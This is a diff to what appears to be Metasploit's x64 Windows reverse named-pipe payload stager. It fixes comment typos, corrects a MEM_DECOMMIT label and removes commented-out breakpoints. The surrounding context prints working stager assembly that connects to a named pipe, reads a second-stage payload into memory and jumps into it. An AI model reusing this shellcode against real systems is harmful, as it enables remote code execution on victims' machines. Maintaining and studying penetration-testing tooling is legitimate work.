@@ -114,8 +114,6 @@ module Payload::Windows::ReverseNamedPipe_x64
       ; Input: RBP must be the address of 'api_call'
       ; Output: RDI will be the handle to the named pipe.
 
-      ;int 3
-
       retry_start:
         push #{retry_count}     ; retry counter
         pop r14
@@ -133,7 +131,7 @@ module Payload::Windows::ReverseNamedPipe_x64
         push 3                  ; dwCreationDisposition (OPEN_EXISTING)
         xor r9, r9              ; lpSecurityAttributes
         xor r8, r8              ; dwShareMode
-        mov rdx, 0xC0000000     ; dwDesiredAccess( GENERIC_READ|GENERIC_WRITE)
+        mov rdx, 0xC0000000     ; dwDesiredAccess(GENERIC_READ|GENERIC_WRITE)
         mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'CreateFileA')}
         call rbp                ; CreateFileA(...)
 
@@ -185,7 +183,7 @@ module Payload::Windows::ReverseNamedPipe_x64
 
     if reliable
       asm << %Q^
-      ; reliability: check to see if the recv worked, and reconnect
+      ; reliability: check to see if the received worked, and reconnect
       ; if it fails
         test eax, eax
         jz cleanup_file
@@ -237,12 +235,12 @@ module Payload::Windows::ReverseNamedPipe_x64
         pop rax
         push r15
         pop rcx                 ; lpAddress
-        push 0x4000             ; MEM_COMMIT
+        push 0x4000             ; MEM_DECOMMIT
         pop r8                  ; dwFreeType
         push 0                  ; 0
         pop rdx                 ; dwSize
         mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualFree')}
-        call rbp                ; VirtualFree(payload, 0, MEM_COMMIT)
+        call rbp                ; VirtualFree(payload, 0, MEM_DECOMMIT)
 
       cleanup_file:
       ; clean up the socket
@@ -264,7 +262,6 @@ module Payload::Windows::ReverseNamedPipe_x64
         sub rsi, rax            ; length -= bytes_received
         test rsi, rsi           ; test length
         jnz read_more           ; continue if we have more to read
-        ;int 3
         jmp r15                 ; return into the second stage
     ^
 
